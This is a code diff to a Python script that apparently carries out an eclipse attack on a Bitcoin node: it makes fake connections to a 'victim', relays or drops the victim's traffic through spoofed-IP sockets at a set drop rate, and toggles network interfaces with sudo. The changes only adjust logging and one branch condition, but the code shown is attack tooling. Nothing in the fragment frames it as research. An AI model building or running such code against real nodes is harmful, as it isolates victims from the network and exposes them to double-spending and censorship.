@@ -104,7 +104,7 @@ def close_connection(index):
 	socket.close()
 	terminal(f'sudo ifconfig {interface} {ip} down')
 
-	print(f'Connection to ({ip} : {port}) successfully closed')
+	print(f'Successfully closed connection to ({ip} : {port})')
 
 # Creates a fake connection to the victim
 def make_fake_connection(src_ip, dst_ip, verbose=True):
@@ -186,17 +186,17 @@ def packet_received(packet):
 
 	# Extract the message type
 	msgtype = packet.load[4:16].decode()
-	print(f'*** Message received ** addr={packet[IP].dst} ** cmd={msgtype}')
 
 	# Relay Bitcoin packets that aren't from the victim
-	if packet[IP].dst == attacker_ip and packet[IP].src == victim_ip:
+	if packet[IP].src == victim_ip:
+		print(f'*** Message received ** addr={packet[IP].dst} ** cmd={msgtype}')
 		if msgtype == 'ping':
 			msg = from_bytes(bytes(payload))
 			print(msg)
 			print(type(msg))
 			# send pong
 			pass
-	if packet[IP].dst == attacker_ip and packet[IP].src != victim_ip:
+	elif packet[IP].dst == attacker_ip and packet[IP].src != victim_ip:
 		if len(spoof_IP_sockets) > 0:
 			if random.random() > eclipse_packet_drop_rate:
 				rand_i = random.randint(0, len(spoof_IP_sockets) - 1)
@@ -204,7 +204,7 @@ def packet_received(packet):
 				rand_port = spoof_IP_and_ports[rand_i][1]
 				rand_socket = spoof_IP_sockets[rand_i]
 
-				#print(f'Relaying {msgtype} from {packet[IP].src} to {rand_ip}:{rand_port}')
+				print(f'*** Relaying {msgtype} from {packet[IP].src} to {rand_ip}:{rand_port}')
 				#packet[IP].src = rand_ip
 				#packet[IP].dst = victim_ip
 
